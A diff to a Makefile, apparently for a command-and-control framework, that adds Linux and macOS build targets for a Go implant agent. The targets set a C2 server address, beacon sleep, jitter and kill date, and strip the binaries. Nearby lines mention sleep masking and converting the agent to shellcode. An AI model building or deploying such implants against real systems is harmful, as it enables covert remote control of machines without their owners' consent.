@@ -18,7 +18,7 @@ GUI_PORT ?= 8888
 GUI_HOST ?= 127.0.0.1
 PROFILE  ?= $(HOME)/.endgame/profiles/stark.json
 
-.PHONY: all server client agent-exe agent-mtls agent-raw certs run init deps bofs clean start build-start stop
+.PHONY: all server client agent-exe agent-mtls agent-raw agent-linux agent-darwin certs run init deps bofs clean start build-start stop
 
 all: server client agent-exe
 
@@ -89,6 +89,38 @@ agent-mtls:
 	    -X '$(AGENTPKG).SleepMaskMode=$(SLEEP_MASK)'" \
 	  -trimpath \
 	  -o bin/agent-mtls.exe \
+	  ./agents/agent-go/cmd/
+
+## Build Linux agent (ELF)
+## Usage: make agent-linux C2_HOST=10.2.20.200 SLEEP=5
+agent-linux:
+	mkdir -p bin
+	CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \
+	$(GO) build \
+	  -ldflags "-s -w \
+	    -X '$(AGENTPKG).ServerURL=http://$(C2_HOST):8080' \
+	    -X '$(AGENTPKG).Transport=http' \
+	    -X '$(AGENTPKG).SleepSec=$(SLEEP)' \
+	    -X '$(AGENTPKG).JitterPct=$(JITTER)' \
+	    $(if $(KILL_DATE),-X '$(AGENTPKG).KillDate=$(KILL_DATE)')" \
+	  -trimpath \
+	  -o bin/agent-linux \
+	  ./agents/agent-go/cmd/
+
+## Build macOS agent (Mach-O)
+## Usage: make agent-darwin C2_HOST=10.2.20.200 SLEEP=5
+agent-darwin:
+	mkdir -p bin
+	CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 \
+	$(GO) build \
+	  -ldflags "-s -w \
+	    -X '$(AGENTPKG).ServerURL=http://$(C2_HOST):8080' \
+	    -X '$(AGENTPKG).Transport=http' \
+	    -X '$(AGENTPKG).SleepSec=$(SLEEP)' \
+	    -X '$(AGENTPKG).JitterPct=$(JITTER)' \
+	    $(if $(KILL_DATE),-X '$(AGENTPKG).KillDate=$(KILL_DATE)')" \
+	  -trimpath \
+	  -o bin/agent-darwin \
 	  ./agents/agent-go/cmd/
 
 ## Convert agent.exe to raw shellcode using go-donut
